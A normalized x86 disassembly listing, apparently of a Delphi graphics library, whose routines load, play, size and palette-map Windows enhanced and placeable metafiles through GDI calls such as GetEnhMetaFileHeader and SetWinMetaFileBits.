mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
xor ecx ecx
mov cl [ ebp - 0x44 ]
lea edx [ ebp - 0x43 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x44 ]
call sub_40426c
mov edx [ ebp - 0x48 ]
mov eax [ rw-data ]
call sub_426524
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
call sub_403234
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_426aed
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b72
lea eax [ ebp - 0x48 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403448
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403448
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_426af2
mov eax [ ebp - 0x4 ]
call sub_403234
call sub_4039e8
call sub_403a3c
mov eax [ ebx + 0xc ]
call sub_403234
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b72
lea eax [ ebp - 0x48 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_403448
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_403448
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
sub_426b7c
push ebx
push esi
push edi
add esp 0xfffffec0
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
je r-xdata
mov [ esp ] 0x0
lea edx [ esp + 0x40 ]
mov eax [ edi ]
call sub_403184
lea edx [ esp + 0x40 ]
mov eax esp
mov cl 0x3f
call sub_402b30
jmp r-xdata
add esp 0x140
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ esp ]
inc ecx
mov edx esp
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
sub_426bd8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0xc ] 0x0
setne bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ebx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
cmp eax [ ebx + 0xc ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_426c54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_426a64
mov eax [ ebp - 0x8 ]
push eax
push sub_426b7c
push ebp
call sub_426bd8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_426cd0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
call sub_422d14
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
push eax
call DeleteEnhMetaFile
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_426d10
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_426d80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_4271e0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_427248
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
xor edx edx
mov eax esi
call sub_426da8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426d87
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
add esp 0xfffffff0
call sub_403558
sub_426d87
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_426da8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor eax eax
push ebp
push sub_426fb4
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4243c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x58 ] edi
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403558
xor edx edx
push ebp
push sub_426f97
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42735c
test eax eax
jne r-xdata
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427344
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427344
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_42735c
mov ecx eax
xor edx edx
xor eax eax
call sub_419034
mov eax ebx
call sub_4042c8
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
jne r-xdata
push 0x8
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x2c ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_4279bc
push 0x4
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4279bc
jmp r-xdata
push ebx
push r-xdata
push esi
push r-xdata
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404388
mov eax [ ebp - 0x20 ]
call sub_4044c8
jmp r-xdata
mov eax esi
call sub_4042c8
test eax eax
jle r-xdata
push 0xa
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
push eax
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul eax eax 0x64
push eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x58 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
call MulDiv
mov edx eax
mov eax edi
call sub_427980
push 0x6
mov eax [ ebp - 0xc ]
push eax
call GetDeviceCaps
imul edx eax 0x64
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427980
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
call CreateEnhMetaFileA
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424a38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426f9e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
call sub_424d08
retn
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
sub_426fbb
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_426fef
inc [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
call sub_4035c0
mov ebx edx
mov edi eax
mov eax edi
call sub_4249b8
mov esi eax
xor edx edx
mov eax edi
call sub_424a38
push esi
call CloseEnhMetaFile
mov edx eax
mov eax [ edi + 0x58 ]
call sub_42787c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_424484
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a8
sub_427044
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_425f30
mov [ esi + 0x2c ] 0x1
mov [ esi + 0x21 ] 0x1
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42708c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428238
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4270bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
test esi esi
je r-xdata
mov edi [ eax + 0x14 ]
call sub_428238
mov edx esi
mov eax ebx
call sub_41aa64
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
mov edx [ eax + 0x28 ]
mov [ ebx + 0x28 ] edx
mov al [ eax + 0x2c ]
mov [ ebx + 0x2c ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
call sub_428234
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp edi eax
je r-xdata
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
retn
sub_427150
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
xor ebp ebp
test esi esi
je r-xdata
mov eax [ esp ]
push esi
push edi
mov esi eax
lea edi [ esp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
dec [ esp + 0xc ]
dec [ esp + 0x10 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
mov eax edi
call sub_4249b8
push eax
call PlayEnhMetaFile
test esi esi
je r-xdata
push 0xffffffff
push esi
mov eax edi
call sub_4249b8
push eax
call SelectPalette
mov ebp eax
mov eax edi
call sub_4249b8
push eax
call RealizePalette
push 0xffffffff
push ebp
mov eax edi
call sub_4249b8
push eax
call SelectPalette
sub_4271e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404008
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax esi
mov edx edi
call sub_404654
mov eax [ esi ]
call sub_4044c8
push eax
push edi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ esi ]
call sub_4044c8
call sub_408994
mov edx eax
mov eax esi
call sub_404654
sub_427248
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404008
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov edi eax
test edi edi
jle r-xdata
mov eax ebx
mov edx edi
call sub_404654
mov eax [ ebx ]
call sub_4044c8
push eax
push edi
mov eax [ esi + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileDescriptionA
mov eax [ ebx ]
call sub_4044c8
call sub_408994
mov ecx eax
inc ecx
mov eax ebx
mov edx 0x1
call sub_404568
mov eax [ ebx ]
call sub_4044c8
call sub_408994
mov edx eax
mov eax ebx
call sub_404654
sub_4272e0
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4274b8
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x54 ] 0x64
push eax
mov eax [ esp + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x20 ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427374
push ebx
push esi
push edi
add esp 0xfffffbfc
mov ebx eax
xor edi edi
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov eax edi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x14 ]
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov esi eax
test esi esi
je r-xdata
cmp esi 0x100
jle r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422d14
mov [ esp ] 0x300
mov [ esp + 0x2 ] si
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov eax esp
push eax
call CreatePalette
mov edx [ ebx + 0x28 ]
mov [ edx + 0x14 ] eax
and esi 0xff
sub_427400
push ebx
add esp 0xffffff9c
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov ebx [ ebx + 0x28 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4274b8
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov eax [ ebx + 0x8 ]
test eax eax
jne r-xdata
push esp
push 0x64
push eax
call GetEnhMetaFileHeader
imul eax [ esp + 0x50 ] 0x64
push eax
mov eax [ esp + 0x4c ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
jmp r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
add esp 0x64
pop ebx
retn
sub_427464
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_427a70
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41c4ac
pop ecx
sub ecx eax
mov edx esi
mov eax ebx
call sub_42761c
mov edx esi
mov eax ebx
call sub_42754c
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
retn
sub_4274b8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
call sub_428238
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_428234
pop esi
pop ebx
retn
sub_4274e0
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esp ] 0x4
jg r-xdata
mov edx esi
mov eax ebx
call sub_427a70
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esp ]
sub ecx 0x4
mov edx esi
mov eax ebx
call sub_42761c
mov edx esi
mov eax ebx
call sub_42754c
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
sub_42754c
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4274b8
lea edx [ ebp - 0x68 ]
mov ecx 0x64
mov eax edi
call sub_41c6d8
cmp [ ebp - 0x40 ] 0x464d4520
je r-xdata
mov eax [ ebp - 0x38 ]
call sub_40279c
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42760c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x68 ]
mov ecx 0x64
call sub_402998
mov ecx [ ebp - 0x38 ]
sub ecx 0x64
mov edx [ ebp - 0x4 ]
add edx 0x64
mov eax edi
call sub_41c6d8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
call SetEnhMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424ca8
mov [ ebx + 0x18 ] 0x0
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x50 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ ebx + 0x10 ] eax
mov [ esi + 0x2c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427613
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4027bc
retn
call sub_424ca8
sub_42761c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_4274b8
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x22 ] 0x9ac6cdd7
jne r-xdata
call sub_424ca8
lea eax [ ebp - 0x22 ]
call sub_425af8
cmp ax [ ebp - 0xe ]
je r-xdata
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x18 ]
movsx edx [ ebp - 0x1c ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0xc ] eax
movzx eax [ ebp - 0x14 ]
push eax
push 0x9ec
movsx eax [ ebp - 0x16 ]
movsx edx [ ebp - 0x1a ]
sub eax edx
push eax
call MulDiv
mov [ ebx + 0x10 ] eax
mov [ ebp - 0x32 ] 0x8
xor eax eax
mov [ ebp - 0x2e ] eax
xor eax eax
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
mov [ ebp - 0x14 ] 0x60
sub [ ebp - 0x8 ] 0x16
mov eax [ ebp - 0x8 ]
call sub_40279c
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x28 ]
xor eax eax
push ebp
push sub_42778b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ esi + 0x28 ]
mov dx [ ebp - 0x14 ]
mov [ eax + 0x18 ] dx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x96 ]
push eax
push 0x64
mov eax [ ebx + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov [ ebp - 0x32 ] 0x8
mov eax [ ebp - 0x76 ]
mov [ ebp - 0x2e ] eax
mov eax [ ebp - 0x72 ]
mov [ ebp - 0x2a ] eax
xor eax eax
mov [ ebp - 0x26 ] eax
mov eax [ ebx + 0x8 ]
push eax
call DeleteEnhMetaFile
lea eax [ ebp - 0x32 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call SetWinMetaFileBits
mov edi eax
mov [ ebx + 0x8 ] edi
test edi edi
jne r-xdata
call sub_424ca8
mov [ esi + 0x2c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427792
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4027bc
retn
call sub_424ca8
sub_42779c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427843
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x2c ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_427821
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40889c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_40c720
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4261fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427828
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x2c ] dl
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] 0x0
sub_42787c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_427ad0
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
push esp
push 0x64
push esi
call GetEnhMetaFileHeader
test eax eax
jne r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x14 ]
call sub_422d14
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] esi
xor edx edx
mov [ eax + 0x1c ] edx
xor edx edx
mov [ eax + 0x20 ] edx
test esi esi
je r-xdata
push eax
call DeleteEnhMetaFile
call sub_424ca8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esp 0x64
pop esi
pop ebx
retn
mov edx [ esp + 0x20 ]
sub edx [ esp + 0x18 ]
mov [ eax + 0xc ] edx
mov edx [ esp + 0x24 ]
sub edx [ esp + 0x1c ]
mov [ eax + 0x10 ] edx
sub_42790c
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4274b8
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_427980
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_427980
jmp r-xdata
mov [ eax + 0x20 ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427980
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x20 ] edx
cmp esi [ eax + 0x10 ]
je r-xdata
mov eax ebx
call sub_4274b8
pop esi
pop ebx
retn
mov eax ebx
call sub_427ad0
mov eax [ ebx + 0x28 ]
mov [ eax + 0x10 ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4279bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x1c ] edx
cmp esi [ eax + 0xc ]
je r-xdata
mov eax ebx
call sub_4274b8
pop esi
pop ebx
retn
mov eax ebx
call sub_427ad0
mov eax [ ebx + 0x28 ]
mov [ eax + 0xc ] esi
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4279fc
push ebx
push esi
add esp 0xffffff9c
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_4274b8
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4279bc
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_4279bc
jmp r-xdata
mov [ eax + 0x1c ] esi
jmp r-xdata
add esp 0x64
pop esi
pop ebx
retn
sub_427a70
push ebx
push esi
push edi
add esp 0xffffff9c
mov ebx edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41c4ac
sub esi eax
cmp esi 0x64
jle r-xdata
cmp esi 0x64
jle r-xdata
mov edx esp
mov ecx 0x64
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov cx 0x1
mov edx 0xffffff9c
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
xor eax eax
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x28 ] 0x464d4520
je r-xdata
mov al 0x1
sub_427ad0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jle r-xdata
mov eax ebx
call sub_4274b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
mov ax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
